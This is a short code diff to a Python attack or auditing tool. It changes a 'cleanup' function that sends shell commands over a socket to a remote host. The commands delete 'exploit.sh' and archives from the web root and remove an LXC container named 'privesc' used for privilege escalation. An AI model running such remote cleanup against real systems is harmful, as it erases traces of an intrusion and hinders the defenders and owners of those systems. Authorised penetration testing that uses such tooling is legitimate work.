@@ -225,7 +225,7 @@ def recvall(sock):
 
 
 def cleanup(conn, file_name, general_info, rep):
-	conn.send('rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;'.encode())
+	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;'''.encode())
 	if general_info['active'] == 'True':
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
